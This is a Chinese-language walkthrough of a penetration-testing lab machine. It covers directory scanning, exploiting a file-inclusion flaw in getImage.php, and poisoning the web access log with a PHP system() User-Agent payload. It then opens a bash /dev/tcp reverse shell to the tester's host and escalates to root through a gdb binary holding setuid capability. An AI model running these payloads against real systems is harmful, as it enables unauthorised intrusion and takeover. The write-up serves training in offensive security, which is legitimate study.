### 信息收集
```
端口扫描发现22,80,8088端口
详细扫描和默认脚本漏洞扫描没有啥信息
```
### web渗透
```
这台靶机的目录爆破让我以后再也不敢对目录爆破不认真了
由于平时使用gobuster多

sudo gobuster dir -u http://192.168.1.28 --wordlist=/usr/share/dirbuster/wordlists/directory-list-1.0.txt
爆出来了blog 是wordpress  但是本人重试了好几次还是访问很慢
甚至拒绝连接，在docs下## OpenLiteSpeed Web Server

看选项发现，好想对流量有限制，所以就没有访问
之际searchspolit wordpress 5.5.1（在源码中有)
但是最后没找到可以利用的，可利用的都是在playing里面

还有一个

由于在一次爆破不可靠，指定一下文件格式在扫一次
sudo gobuster dir -u http://192.168.1.28 -x rar,zip,sql,txt,php --wordlist=/usr/share/dirbuster/wordlists/directory-list-1.0.txt
发现还是没有多出可用信息
8088也是同样多出的几个目录均有效信息
upload.html本以为可以文件上传，但只是测试网页

本人在wordpress的上面花了挺多时间，最后无耐又扫了遍目录，
```
#### dirb
```
先是搞了nikto，dirsearch均无扫到有效信息

最后无意中试了一下dirb发现新增目录
cgi-data
```
### 文件包含日志UA文件
```
http://192.168.1.28/cgi-data/getImage.php
源码暴露了
</?php include $_GET['file']; */
</body>
?file=/etc/passwd发现竟然包含成功

此处还可以使用fuzz爆出file信息

尝试读取铭感文件，但是本人在此方面又花了很多功夫，
本人对linux目录结构和web目录结构均不熟悉

想看看web的admin配置文件有没有暴露上面用户信息，但能读取的都没有，很多访问拒绝
想看看系统日志，但是权限不够
而且不知道目录结构，很麻烦

Linux系统有个目录proc，会记录每一个打开的文件，并分配一个id信息
记录打开路径

当你查看 `/proc/self/fd` 目录时，你会看到一系列的数字命名的符号链接，这些数字就是文件描述符的编号。每个符号链接指向当前进程中打开的文件或连接的实际路径。
```
#### 遍历fd/的文件
```
在burpsuit中
?file=/proc/self/fd/$1$遍历文件
在8中发现，/var/log/durian.log/access.log包含了ua信息
那我们伪造ua反弹shell
?cmd=/bin/bash+-i+>&+/dev/tcp/192.168.1.3/4444+0>&1
UA:<?php system($_GET['cmd']); ?>
```

### 提权
```
sudo -l
发现system shutdown 和 ping
在# GTFOBins中并无找到可利用的
在/usr/bin/下发现一个rwxrwxrwx的root文件，但是当用到root权限的时候就会被拒绝，发现

getcap -r / 2>/dev/null
发现 gdn --set_suid
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
gdb:简单理解就是可以启动程序并且按照自己的自定义随心所欲的运行程序
-nx:不要从任何.gdbinit初始化文件执行命令
-ex"执行给定的GDB命令
简单理解就是首先利用gdb的权限去执行命令：命令的作用是利用python 设置一个uid为0（就是root）的shell
```